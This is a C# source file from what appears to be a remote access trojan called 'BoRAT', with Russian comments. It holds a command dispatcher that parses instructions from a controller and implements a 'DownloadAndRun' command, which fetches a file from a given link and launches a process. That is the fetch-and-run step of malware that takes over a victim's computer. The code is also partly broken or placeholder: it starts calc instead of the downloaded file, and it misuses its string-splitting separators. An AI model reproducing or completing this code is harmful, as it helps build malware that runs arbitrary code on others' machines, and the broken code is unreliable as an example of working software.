using BoRAT.Core.Network;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;

namespace BoRAT.Core.Commands
{
    class Work
    {
        public static void Run(string commands)
        {
            // Есть ли команды
            if (commands.IndexOf("*") == -1) return;
            else commands = commands.Remove(commands.Length - 1, 1);
            // Много или одна
            if (commands.IndexOf("*") != -1)
            {
                string[] cmds = commands.Split(new char['*']);
                foreach(string command in cmds)
                    Console.WriteLine(command); //_Run(command);
            }
            else
                _Run(commands);
        }

        private static void _Run(string command)
        {
            string[] cmd = command.Split(new Char['|']);
            //Console.WriteLine(cmd[0]);
            switch (cmd[0])
            {
                case "DownloadAndRun":
                    DownloadAndRun(cmd[1]);
                    break;
            }
        }

        private static void DownloadAndRun(string link)
        {
            Http.DownloadFile(link);
            Process.Start("cmd /C calc");
        }
    }
}
